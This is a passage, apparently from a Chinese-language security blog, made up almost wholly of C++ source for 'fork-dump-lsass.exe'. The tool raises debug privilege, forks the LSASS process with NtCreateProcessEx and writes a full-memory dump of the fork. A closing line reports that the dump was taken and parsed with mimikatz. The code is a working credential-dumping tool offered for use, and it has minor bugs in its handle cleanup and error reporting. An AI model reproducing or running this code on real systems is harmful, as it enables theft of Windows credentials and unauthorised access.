+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span>(WINAPI<span style="color:#f92672">*</span> _RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_UNICODE_STRING</span> {
+</span></span><span style="display:flex;"><span>    USHORT Length;
+</span></span><span style="display:flex;"><span>    USHORT MaximumLength;
+</span></span><span style="display:flex;"><span>    PWSTR  Buffer;
+</span></span><span style="display:flex;"><span>} UNICODE_STRING, <span style="color:#f92672">*</span> PUNICODE_STRING;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_OBJECT_ATTRIBUTES</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ULONG Length;
+</span></span><span style="display:flex;"><span>    PVOID RootDirectory;
+</span></span><span style="display:flex;"><span>    PUNICODE_STRING ObjectName;
+</span></span><span style="display:flex;"><span>    ULONG Attributes;
+</span></span><span style="display:flex;"><span>    PVOID SecurityDescriptor;
+</span></span><span style="display:flex;"><span>    PVOID SecurityQualityOfService;
+</span></span><span style="display:flex;"><span>} OBJECT_ATTRIBUTES, <span style="color:#f92672">*</span> POBJECT_ATTRIBUTES;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span>(NTAPI<span style="color:#f92672">*</span> fpNtCreateProcessEx)
+</span></span><span style="display:flex;"><span>(
+</span></span><span style="display:flex;"><span>    OUT PHANDLE     ProcessHandle,
+</span></span><span style="display:flex;"><span>    IN ACCESS_MASK  DesiredAccess,
+</span></span><span style="display:flex;"><span>    IN POBJECT_ATTRIBUTES ObjectAttributes  OPTIONAL,
+</span></span><span style="display:flex;"><span>    IN HANDLE   ParentProcess,
+</span></span><span style="display:flex;"><span>    IN ULONG    Flags,
+</span></span><span style="display:flex;"><span>    IN HANDLE SectionHandle     OPTIONAL,
+</span></span><span style="display:flex;"><span>    IN HANDLE DebugPort     OPTIONAL,
+</span></span><span style="display:flex;"><span>    IN HANDLE ExceptionPort     OPTIONAL,
+</span></span><span style="display:flex;"><span>    IN BOOLEAN  InJob
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Clean</span>(HANDLE processHandle, HANDLE lsassHandle, HANDLE dumpFile) {
+</span></span><span style="display:flex;"><span>	processHandle <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	CloseHandle(processHandle);
+</span></span><span style="display:flex;"><span>	lsassHandle <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	CloseHandle(lsassHandle);
+</span></span><span style="display:flex;"><span>	dumpFile <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	CloseHandle(dumpFile);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>	ULONG t <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	_RtlAdjustPrivilege RtlAdjustPrivilege;
+</span></span><span style="display:flex;"><span>	RtlAdjustPrivilege <span style="color:#f92672">=</span> (_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlAdjustPrivilege&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE processHandle <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	HANDLE lsassHandle <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	HANDLE dumpFile <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (argc<span style="color:#f92672">!=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;fork-dump-lsass.exe [dump file name] [target process ID]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> dumpFileName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>	dumpFile <span style="color:#f92672">=</span> CreateFileA(dumpFileName, GENERIC_ALL, <span style="color:#ae81ff">0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (dumpFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;CreateFile Failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,GetLastError);
+</span></span><span style="display:flex;"><span>		Clean(processHandle, lsassHandle, lsassHandle);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	RtlAdjustPrivilege(<span style="color:#ae81ff">20</span>, TRUE, FALSE, <span style="color:#f92672">&amp;</span>t);
+</span></span><span style="display:flex;"><span>	lsassHandle <span style="color:#f92672">=</span> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
+</span></span><span style="display:flex;"><span>	fpNtCreateProcessEx _NtCreateProcessEx <span style="color:#f92672">=</span> (fpNtCreateProcessEx)GetProcAddress(LoadLibraryA(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;NtCreateProcessEx&#34;</span>);
+</span></span><span style="display:flex;"><span>	NTSTATUS status <span style="color:#f92672">=</span> _NtCreateProcessEx(<span style="color:#f92672">&amp;</span>processHandle,PROCESS_ALL_ACCESS,NULL, lsassHandle,<span style="color:#ae81ff">0</span>,NULL,NULL,NULL,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x00000000</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;NtCreateProcessEx Failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>		Clean(processHandle, lsassHandle, lsassHandle);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (MiniDumpWriteDump(processHandle, GetProcessId(processHandle), dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL) <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;MiniDumpWriteDump Failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>		Clean(processHandle, lsassHandle, lsassHandle);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;sucess!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>编译后，尝试运行；运行成功dump出了lsass的内存，然后让<code>mimikatz</code>进行解析</p>
 <p><img src="/images/Use%20fork%20dump%20lsass/image-20220219204912227.png" alt="image-20220219204912227"></p>
 
         </div>
